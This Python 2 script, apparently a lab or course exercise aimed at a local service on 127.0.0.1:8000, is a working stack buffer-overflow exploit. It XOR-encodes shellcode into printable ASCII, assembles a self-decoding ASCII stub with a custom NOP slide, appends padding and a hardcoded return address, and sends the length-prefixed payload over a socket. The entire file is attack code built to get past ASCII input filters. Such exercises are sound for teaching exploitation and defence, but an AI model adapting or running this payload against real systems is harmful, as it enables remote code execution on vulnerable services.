#!/usr/bin/python

import os
import socket
import q2
import assemble
import struct

HOST = '127.0.0.1'
SERVER_PORT = 8000
LOCAL_PORT = 1337

ASCII_MAX = 0x7f
bytes_to_xor = []


def network_order_uint32(value):
    return struct.pack('>L', value)


def get_raw_shellcode():
    return q2.get_shellcode()


def get_shellcode():
    raw_shellcode = get_raw_shellcode()
    shellcode = ''
    i = 0
    for char in raw_shellcode:
        curr_byte = ord(char)
        if (curr_byte > ASCII_MAX):
            curr_byte ^= 0xff
            bytes_to_xor.append(i)
        shellcode += chr(curr_byte)
        i += 1
    return shellcode


def get_payload():
    buf_len = 1040
    # our return address
    addr = chr(0x78) + chr(0xde) + chr(0xff) + chr(0xbf)
    # get encoded shellcode and create list of positions of bytes to xor
    shellcode = get_shellcode()
    # list of decoder instructions
    instructions = []
    # put offset to shellcode in eax
    instructions.append('push esp')
    instructions.append('pop eax')
    instructions.append('add eax, 0x50005000')
    instructions.append('sub eax, 0x50005100')
    # now eax has esp-256
    for i in range(0x100 - len(shellcode) - 4):
        instructions.append('inc eax')
    # init ebx
    instructions.append('push 0')
    instructions.append('pop ebx')
    # create mask 0xff and put in ebx
    instructions.append('dec ebx')
    last = 0
    for b in bytes_to_xor:
        diff = b - last
        for i in range(diff):
            instructions.append('inc eax')
        instructions.append('xor byte ptr [eax], bl')
        last = b
    decoder = ''.join((inst + '\n') for inst in instructions)
    asm_decoder = assemble.assemble_data(decoder)
    # make a multiple of 4
    nop_len = 4 * ((buf_len - len(asm_decoder) - len(shellcode)) // 4)
    # our nop is of length 2 thats why we need to divide by 2
    # create nop ascii alternative, increment and decrement
    ascii_nop = assemble.assemble_data('inc ebx\ndec ebx')
    nop_slide = ascii_nop * (nop_len // 2)
    # suffix padding, between the end of the shell code and
    padding_len = buf_len - len(shellcode) - len(asm_decoder) - nop_len
    # problem can occur if length of padding is odd because our nop is of
    # length 2
    padding = 'p' * padding_len
    message = ''.join([nop_slide, asm_decoder, shellcode, padding, addr])
    payload = network_order_uint32(len(message)) + message
    # print(len(payload))
    return payload


def main():
    payload = get_payload()
    conn = socket.socket()
    conn.connect((HOST, SERVER_PORT))
    try:
        conn.sendall(payload)
    finally:
        conn.close()


if __name__ == '__main__':
    main()
